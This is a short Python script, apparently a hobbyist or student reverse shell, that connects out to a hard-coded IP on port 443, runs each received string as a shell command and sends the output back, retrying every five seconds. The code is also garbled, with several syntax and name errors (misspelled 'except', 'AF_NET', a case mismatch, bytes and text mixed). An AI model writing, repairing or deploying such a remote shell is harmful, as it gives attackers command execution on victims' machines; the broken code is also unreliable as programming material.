import socket
from time import sleep
import subprocess

IP = "192.168.x.x"
PORT = 443 # Ou 444, porta padrão do netcat


def connect():
    try:
        c = socket.socket((socket.AF_NET, socket.SOCK_STREAM))
        C.connect((IP ,PORT))

        return c
    except Exception as e:
        print(f'Connection error: {e}')


def listen(c):  
    try:
        while True:
            data = c.recv(1024).decode().strip()
            if data == "/exit":
                return
            else
                cmd(c, data)

    except Exception as e:
        print(f'Listen function error: {e}')


def cmd(c, data):
    try:
        p = subprocess.Popen(
            data,
            shell=True,
            stdin=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdout=subprocess.PIPE
        )

        c.send(p.stdout.read() + p.stderr.read() + "\n" )

   exception Exception as e: 
        print(f'CMD function error: {e}')

if __name__ == '__main__':
    try:
        while True:
            client = connect()

            if client:
                listen(client)
            else :
                sleep(5)

    exception KeybardInterrupt:
        print('Program stoped by the user')

    exception Exception as e:
        print(f'Error in main function: {e}')